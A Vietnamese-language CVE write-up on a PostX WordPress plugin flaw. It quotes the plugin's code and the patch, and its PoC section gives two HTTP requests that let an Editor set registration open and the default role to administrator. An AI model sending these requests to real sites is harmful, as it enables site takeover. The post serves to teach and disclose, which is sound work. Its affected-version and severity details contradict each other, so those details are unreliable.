---
title: CVE-2025-53425 Analysis & POC
description: Security Vulnerability in WordPress PostX Plugin.
date: 2026-01-05 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, privilege escalation]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng **Gán Quyền Không Chính Xác** (**Incorrect Privilege Assignment**) trong **PostX, Inc. PostX PostX-lite** cho phép **Leo Thang Đặc Quyền** (**Privilege Escalation**). Vấn đề này ảnh hưởng đến **PostX** từ **n/a** đến **<= 4.1.2**.

* **CVE ID**: [CVE-2025-53425](https://www.cve.org/CVERecord?id=CVE-2025-53425)
* **Vulnerability Type**: Privilege Escalation
* **Affected Versions**: <= 4.1.35
* **Patched Versions**: 4.1.36
* **CVSS severity**: Medium (7.2)
* **Required Privilege**: Editor
* **Product**: [WordPress PostX Plugin](https://wordpress.org/plugins/ultimate-post/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **PostX**:  
    * `4.1.35` – **vulnerable**  
    * `4.1.36` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đã đăng ký REST API:

```php {title="Styles.php v4.1.35" hl_lines=[7] data-open=true}
register_rest_route(
    'ultp/v1',
    '/postx_presets/',
    array(
        array(
            'methods'  => 'POST',
            'callback' => array($this, 'postx_presets_callback'),
            'permission_callback' => function () {
                return current_user_can('edit_posts');
            },
            'args' => array()
        )
    )
);
```

Với cấu hình trên, API được expose dưới dạng:

```
POST /wp-json/ultp/v1/postx_presets/
```

Khi có request gửi đến endpoint này với method POST, WordPress sẽ gọi `postx_presets_callback()`. Tuy nhiên, trước khi hàm này được thực thi, request bắt buộc phải vượt qua bước kiểm tra quyền thông qua `current_user_can('edit_posts')`.

Quyền `edit_posts` được cấp cho người dùng có role **Contributor** trở lên. Trong khi đó, lỗ hổng được công bố lại yêu cầu quyền **Editor**. Do sự khác biệt này, cần tiếp tục phân tích nội dung của hàm `postx_presets_callback()` để xác định nguyên nhân và cách lỗ hổng có thể bị khai thác.

```php {title="Styles.php v4.1.35" hl_lines=[5,6,9,10] data-open=true}
public function postx_presets_callback($server) {
    $post = $server->get_params();
    $type = isset($post['type']) ? $post['type'] : '';
    $key = isset($post['key']) ? $post['key'] : '';
    $data = isset($post['data']) ? $post['data'] : '';

    if ( $type ) {
        if ( $type == 'set' ) {
            if ( current_user_can('edit_others_posts') ) {
                update_option($key, $data);
            }
            return ['success' => true];
        } else {
            return ['success' => true, 'data' => get_option($key, [])];
        }
    } else {
        return ['success' => false];
    }
}
```

Hàm callback lấy các tham số `type`, `key` và `data` từ request. Khi `type` bằng `'set'`, hàm sẽ gọi `update_option()` để cập nhật option tương ứng với `$key`, với điều kiện người dùng có quyền `edit_others_posts` (chỉ dành cho role **Editor** trở lên). Trong các trường hợp còn lại, hàm trả về giá trị của option thông qua `get_option()`.

Như vậy, có thể thấy rõ lý do lỗ hổng được công bố với yêu cầu quyền **Editor**.

Một kịch bản phổ biến để khai thác lỗ hổng **Privilege Escalation** thông qua hàm `update_option()` là:

* Đặt `users_can_register = 1` để cho phép người dùng tự đăng ký
* Đặt `default_role = administrator` để các tài khoản mới được tạo có quyền Administrator

Tuy nhiên, do đây là một REST API sử dụng phương thức **POST**, nên khi được gọi từ trình duyệt, request bắt buộc phải kèm theo nonce. Với các REST request có khả năng thay đổi dữ liệu (POST / PUT / DELETE), WordPress yêu cầu nonce để chống tấn công CSRF. Nếu request không có nonce, WordPress sẽ từ chối với lỗi `rest_forbidden`; nếu nonce không hợp lệ, request sẽ bị chặn với lỗi `rest_cookie_invalid_nonce`.

Để lấy được REST API nonce, ta cần đăng nhập vào Admin Dashboard và gọi `wpApiSettings.nonce` trong **browser console** khi tạo post, vì nonce này chỉ được WordPress inject vào trang khi người dùng đã đăng nhập hợp lệ. Đây là trường hợp đặc biệt, nó được inject vào trang khi tạo post.

Bản vá **v4.1.36** đã siết chặt kiểm soát quyền bằng cách thay đổi `permission_callback` như sau:

```php {title="Styles.php v4.1.36" hl_lines=[] data-open=true}
'permission_callback' => function () {
    return current_user_can('manage_options'); // Admins only
},
```

Với thay đổi này, chỉ người dùng có quyền `manage_options` (role **Administrator**) mới có thể truy cập endpoint, qua đó ngăn chặn khả năng khai thác lỗ hổng **Privilege Escalation** từ các role thấp hơn.

## Flow
{{< mermaid >}}
flowchart TD
A["Editor (Authenticated User)"]
--> B["Access Admin / Create Post Page"]

B --> C["WordPress injects wpApiSettings.nonce"]
C --> D["Editor obtains REST API nonce"]

D --> E["POST /wp-json/ultp/v1/postx_presets/"]
E --> F["X-WP-Nonce validation"]

F -- Invalid --> G["Request rejected"]
F -- Valid --> H["permission_callback: current_user_can('edit_posts')"]

H -- No --> I["Access denied"]
H -- Yes --> J["postx_presets_callback()"]

J --> K{"type == 'set'?"}
K -- No --> L["get_option()"]
K -- Yes --> M{"current_user_can('edit_others_posts')?"}

M -- No --> N["Return success without update"]
M -- Yes --> O["update_option(key, data)"]

O --> P["Modify sensitive wp_options"]
P --> Q["Privilege escalation via default_role / users_can_register"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Dùng Editor account để tạo post
2. Gọi `wpApiSettings.nonce` trong **browser console** để lấy nonce 
3. Gửi request với nonce vừa lấy:

* **Request 1**:
```http
POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1
Host: localhost
Cookie: editor_cookie 
X-WP-Nonce: valid_nonce

type=set&key=users_can_register&data=1
```

* **Request 2**:
```http
POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1
Host: localhost
Cookie: editor_cookie 
X-WP-Nonce: valid_nonce

type=set&key=default_role&data=administrator
```

![Result](default.png "Default role")

4. Tạo user mới và login

## Conclusion

Lỗ hổng CVE-2025-53425 xuất phát từ việc **kết hợp không nhất quán giữa kiểm soát quyền ở mức REST API và logic xử lý trong callback**. Mặc dù endpoint REST chỉ yêu cầu quyền `edit_posts`, nhưng hành vi nguy hiểm nhất (`update_option()`) lại được bảo vệ bằng `edit_others_posts`, cho phép **Editor** thực hiện các thay đổi nhạy cảm trong bảng `wp_options`. Khi kết hợp với REST API nonce hợp lệ, một Editor có thể lợi dụng endpoint này để thay đổi các option quan trọng, dẫn đến **Privilege Escalation**. Bản vá ở phiên bản `4.1.36` đã khắc phục triệt để vấn đề bằng cách giới hạn endpoint chỉ cho người dùng có quyền `manage_options`.

## Key Takeaways

* `permission_callback` phải **phản ánh chính xác mức độ nhạy cảm của hành vi trong callback**
* `update_option()` là hàm **rất nguy hiểm** nếu không bị giới hạn quyền chặt chẽ
* REST API nonce **chỉ chống CSRF**, không thay thế cho kiểm soát phân quyền
* Editor **không nên** được phép thay đổi các global option ảnh hưởng đến toàn hệ thống
* Vá lỗi hiệu quả nhất là **đặt quyền cao ngay từ REST endpoint**, thay vì kiểm tra rải rác trong callback

## References
[Privilege Escalation](https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/)

[WordPress PostX Plugin <= 4.1.35 is vulnerable to a medium priority Privilege Escalation](https://patchstack.com/database/wordpress/plugin/ultimate-post/vulnerability/wordpress-postx-plugin-4-1-35-privilege-escalation-vulnerability) 